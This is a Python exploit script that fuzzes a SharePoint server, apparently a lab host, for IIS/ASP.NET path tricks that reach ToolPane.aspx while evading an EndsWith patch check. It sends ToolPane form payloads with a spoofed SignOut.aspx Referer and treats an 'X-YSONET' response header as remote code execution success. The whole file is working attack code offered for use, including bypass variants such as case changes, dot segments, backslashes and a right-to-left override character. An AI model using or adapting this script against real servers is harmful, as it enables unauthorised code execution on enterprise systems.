#!/usr/bin/env python3
"""
Test sophisticated IIS/ASP.NET routing bypasses
Purpose: Find IIS routing quirks that reach ToolPane.aspx handler while bypassing EndsWith check
"""
import requests

requests.packages.urllib3.disable_warnings()

def test_bypass(target, path, description):
    """Test bypass attempt"""
    url = f"{target}{path}"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows; U; Windows CE; Mobile; like Android; ko-kr) AppleWebKit/533.3",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Content-Type": "application/x-www-form-urlencoded; charset=utf-8",
        "Referer": "/_layouts/SignOut.aspx",
    }
    
    payload = "MSOTlPn_DWP=test&MSOTlPn_Uri=http://10.10.10.166/test"
    
    print(f"\n[*] Testing: {description}")
    print(f"    Path: {path}")
    
    try:
        response = requests.post(url, headers=headers, data=payload, verify=False, timeout=30)
        print(f"    Status: {response.status_code}")
        
        if "X-YSONET" in response.headers:
            print(f"    [!!!] RCE SUCCESS!")
            return True
        
        if response.status_code == 200:
            # Check if it's a real handler response or error page
            if len(response.text) > 20000:
                print(f"    [+] Large response ({len(response.text)} bytes) - might be real handler")
            if "ToolPane" in response.text:
                print(f"    [+] Response contains 'ToolPane' - handler might be reached")
                
    except Exception as e:
        print(f"    Error: {str(e)}")
    
    return False

if __name__ == "__main__":
    target = "http://10.10.10.166"
    
    tests = [
        # Case variations (EndsWith is case-insensitive, but test anyway)
        ("/_layouts/15/ToolPane.Aspx?DisplayMode=Edit&foo=/ToolPane.aspx", "Case: .Aspx"),
        ("/_layouts/15/ToolPane.ASPX?DisplayMode=Edit&foo=/ToolPane.aspx", "Case: .ASPX"),
        ("/_layouts/15/TOOLPANE.ASPX?DisplayMode=Edit&foo=/ToolPane.aspx", "Case: TOOLPANE"),
        
        # URL normalization bypasses
        ("/_layouts/15/./ToolPane.aspx?DisplayMode=Edit&foo=/ToolPane.aspx", "Dot segment before ToolPane"),
        ("/_layouts/./15/ToolPane.aspx?DisplayMode=Edit&foo=/ToolPane.aspx", "Dot segment in path"),
        ("/_layouts/15/../15/ToolPane.aspx?DisplayMode=Edit&foo=/ToolPane.aspx", "DotDot normalization"),
        
        # Fragment/anchor (usually ignored by server)
        ("/_layouts/15/ToolPane.aspx#test?DisplayMode=Edit&foo=/ToolPane.aspx", "Fragment before query"),
        
        # Mixed separators (Windows)
        ("/_layouts\\15/ToolPane.aspx?DisplayMode=Edit&foo=/ToolPane.aspx", "Backslash separator"),
        ("/\\_layouts/15/ToolPane.aspx?DisplayMode=Edit&foo=/ToolPane.aspx", "Backslash prefix"),
        
        # Unicode homoglyphs (if not normalized)
        ("/_layouts/15/ToolPane\u202e.aspx?DisplayMode=Edit&foo=/ToolPane.aspx", "RTL override"),
        
        # Alternative file extensions that might map to same handler
        ("/_layouts/15/ToolPane.ashx?DisplayMode=Edit&foo=/ToolPane.aspx", "Try .ashx"),
        ("/_layouts/15/ToolPane.asmx?DisplayMode=Edit&foo=/ToolPane.aspx", "Try .asmx"),
        
        # Query string in path (some servers parse this differently)
        ("/_layouts/15/ToolPane.aspx?test=1.aspx?DisplayMode=Edit&foo=/ToolPane.aspx", "Query in middle"),
    ]
    
    for path, desc in tests:
        test_bypass(target, path, desc)

